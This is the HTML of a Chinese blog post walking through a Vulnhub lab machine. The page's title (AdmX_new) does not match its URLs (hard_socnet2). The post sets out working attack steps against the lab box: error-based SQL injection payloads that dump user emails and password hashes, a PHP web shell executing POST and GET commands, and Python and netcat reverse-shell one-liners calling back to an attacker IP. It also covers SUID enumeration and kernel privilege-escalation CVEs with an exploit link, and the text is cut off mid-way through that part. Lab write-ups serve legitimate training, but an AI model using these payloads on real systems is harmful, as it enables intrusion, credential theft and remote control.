@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="主机发现 1nmap -sP 192.168.31.0&#x2F;24    端口扫描 1nmap -p- 192.168.31.101   服务扫描 1nmap -sV -p 22,80,8000 192.168.31.101   访问web80   登录框，Ubuntu+Apache+PHP+Python+MySQL 访问web8000   不支持GET请求，换其它请求类型？ 先从80登录框入手 123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机之AdmX_new">
+<meta property="og:url" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/index.html">
+<meta property="og:site_name" content="Rsherhan的博客">
+<meta property="og:description" content="主机发现 1nmap -sP 192.168.31.0&#x2F;24    端口扫描 1nmap -p- 192.168.31.101   服务扫描 1nmap -sV -p 22,80,8000 192.168.31.101   访问web80   登录框，Ubuntu+Apache+PHP+Python+MySQL 访问web8000   不支持GET请求，换其它请求类型？ 先从80登录框入手 123">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170014489.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170119799.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170352319.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170541161.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417171335932.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174210561.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174333411.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417181840390.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201303157.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201400421.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201837518.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417202512417.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204053603.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204120999.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204209628.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204632436.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204725470.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204959441.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418063632369.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205156091.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205446204.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205511249.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205807779.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210152355.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210338075.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210517187.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211059062.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211331131.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210627124.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211915852.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212145485.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418062534849.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212944873.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418054705270.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055841792.png">
+<meta property="og:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055904066.png">
+<meta property="article:published_time" content="2022-04-17T02:12:45.000Z">
+<meta property="article:modified_time" content="2022-04-17T23:07:20.718Z">
+<meta property="article:author" content="Rsherhan">
+<meta property="article:tag" content="打靶,漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170014489.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/2/004-32.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/2/001-192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/2/002-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Vulnhub靶机之AdmX_new</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Rsherhan的博客" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&text=Vulnhub靶机之AdmX_new"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&is_video=false&description=Vulnhub靶机之AdmX_new"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Vulnhub靶机之AdmX_new&body=Check out this article: http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&title=Vulnhub靶机之AdmX_new"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&name=Vulnhub靶机之AdmX_new&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/&t=Vulnhub靶机之AdmX_new"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Vulnhub靶机之AdmX_new
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rsherhan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-17T02:12:45.000Z" itemprop="datePublished">2022-04-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Vulnhub%E9%9D%B6%E6%9C%BA/">Vulnhub靶机</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%89%93%E9%9D%B6-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">打靶,漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>主机发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170014489.png" alt="image-20220417170014489" style="zoom:80%;">
+
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170119799.png" alt="image-20220417170119799"></p>
+<p>服务扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 22,80,8000 192.168.31.101</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170352319.png" alt="image-20220417170352319"></p>
+<p>访问web80</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417170541161.png" alt="image-20220417170541161" style="zoom: 50%;">
+
+<p>登录框，Ubuntu+Apache+PHP+Python+<em><strong>MySQL</strong></em></p>
+<p>访问web8000</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417171335932.png" alt="image-20220417171335932" style="zoom: 67%;">
+
+<p>不支持GET请求，换其它请求类型？</p>
+<p>先从80登录框入手</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆破？但不知email		放弃</span><br><span class="line">注入？bp抓包		post型报错注入</span><br><span class="line">万能密码，or 1=1		对email格式进行检查</span><br><span class="line">可以注册，先注册个账号，看后台功能       后台任意文件getshell</span><br></pre></td></tr></table></figure>
+
+<p>注入？bp抓包</p>
+<p>存在爆破注入</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174210561.png" alt="image-20220417174210561"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useremail=test%40qq.com&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;userpass=123&amp;login=Login</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417174333411.png" alt="image-20220417174333411"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库名	socialnetwork	</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+	</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名 		friendship、posts、user_phone、users</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;socialnetwork&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">users字段名	user_id、user_firstname、user_firstname、user_lastname、user_nickname、user_password、user_email、user_gender、user_birthdate、user_status、user_about、user_hometown	</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;socialnetwork&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_email值  admin@localhost.com、testuser@localhost.com</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select user_email from users limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_password值</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select substr(user_password,1,20) from users limit 0,1),0x7e),1)--+  21232f297a57a5a74389</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select substr(user_password,21,20) from users limit 0,1),0x7e),1)--+</span><br><span class="line">4a0e4a801fc3</span><br><span class="line">21232f297a57a5a743894a0e4a801fc3		admin</span><br></pre></td></tr></table></figure>
+
+<p>md5解密</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417181840390.png" alt="image-20220417181840390" style="zoom:67%;">
+
+<p>同样的方法获取到Emial及密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@localhost.com			21232f297a57a5a743894a0e4a801fc3			admin</span><br><span class="line">testuser@localhost.com		5d9c68c6c50ed3d02a2fcf54f63993b6			testuser</span><br></pre></td></tr></table></figure>
+
+<p> 利用<a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6c;&#x6f;&#99;&#x61;&#x6c;&#104;&#111;&#x73;&#x74;&#46;&#99;&#x6f;&#109;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#x6c;&#x6f;&#99;&#x61;&#x6c;&#104;&#111;&#x73;&#x74;&#46;&#99;&#x6f;&#109;</a>登录后台</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201303157.png" alt="image-20220417201303157" style="zoom: 50%;">
+
+<p>搜索框处存在报错注入</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201400421.png" alt="image-20220417201400421" style="zoom:50%;">
+
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417201837518.png" alt="image-20220417201837518" style="zoom:50%;">
+
+<p>任意文件上传</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417202512417.png" alt="image-20220417202512417" style="zoom:50%;">
+
+<p>上传一句话木马mz.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mz&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>右键新标签打开图片，发现上传的mz.php重命名为12.php</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204053603.png" alt="image-20220417204053603" style="zoom:67%;">
+
+<p>测试命令执行</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204120999.png" alt="image-20220417204120999"></p>
+<p>测试一句话phpinfo()</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204209628.png" alt="image-20220417204209628" style="zoom:50%;">
+
+<p>蚁剑连接</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204632436.png" alt="image-20220417204632436" style="zoom:67%;">
+
+<p>权限为www-data</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204725470.png" alt="image-20220417204725470" style="zoom:67%;">
+
+<p>反弹shell，提权</p>
+<p>python和nc都可以反弹</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417204959441.png" alt="image-20220417204959441"></p>
+<p>python反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418063632369.png" alt="image-20220418063632369"></p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205156091.png" alt="image-20220417205156091"></p>
+<p>nc反弹</p>
+<p>同样还是禁用了-e参数，可以用nc串联，这次使用另一种反弹方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.31.125 12346 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205446204.png" alt="image-20220417205446204"></p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205511249.png" alt="image-20220417205511249"></p>
+<p>当然也可以将&#x2F;bin&#x2F;bash换成&#x2F;bin&#x2F;sh，只要目标机上存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.125 12347 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417205807779.png" alt="image-20220417205807779"></p>
+<p>信息搜集</p>
+<p>翻目录发现mysql连接文件获取到账号和密码</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210152355.png" alt="image-20220417210152355" style="zoom:67%;">
+
+<p>连接数据库，没发现有用数据</p>
+<img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210338075.png" alt="image-20220417210338075" style="zoom: 80%;">
+
+<p>查看可以远程登录的账号</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210517187.png" alt="image-20220417210517187"></p>
+<p>尝试用admin数据库密码ssh远程登录socnet，可惜失败</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211059062.png" alt="image-20220417211059062"></p>
+<p>suid提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211331131.png" alt="image-20220417211331131"></p>
+<p>查看socnet的&#x2F;home目录</p>
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417210627124.png" alt="image-20220417210627124"></p>
+<p>常规提权思路</p>
+<p>www-data——&gt;socnet——&gt;root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查内核		uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417211915852.png" alt="image-20220417211915852"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看Ubuntu版本详细信息		lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220417212145485.png" alt="image-20220417212145485"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看pkexec版本		pkexec --version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418062534849.png" alt="image-20220418062534849"></p>
+<p>这次不走寻常路，分别利用CVE-2021-3493和CVE-2021-4034完成提权</p>
+<p>利用CVE-2021-3493提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp地址：https://github.com/briskets/CVE-2021-3493</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">漏洞概述：OverlayFS漏洞允许Ubuntu下的本地用户获得root权限。Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。</span><br><span class="line">受影响版本：</span><br><span class="line">            Ubuntu 20.10</span><br><span class="line">            Ubuntu 20.04 LTS</span><br><span class="line">            Ubuntu 19.04</span><br><span class="line">            Ubuntu 18.04 LTS</span><br><span class="line">            Ubuntu 16.04 LTS</span><br><span class="line">            Ubuntu 14.04 ESM</span><br><span class="line">修复建议：更新系统软件包版本。</span><br><span class="line">         在Linux 5.11中，对的调用 cap_convert_nscap 已移入 vfs_setxattr，更新Linux内核至5.11则不会再被利用。</span><br></pre></td></tr></table></figure>
+
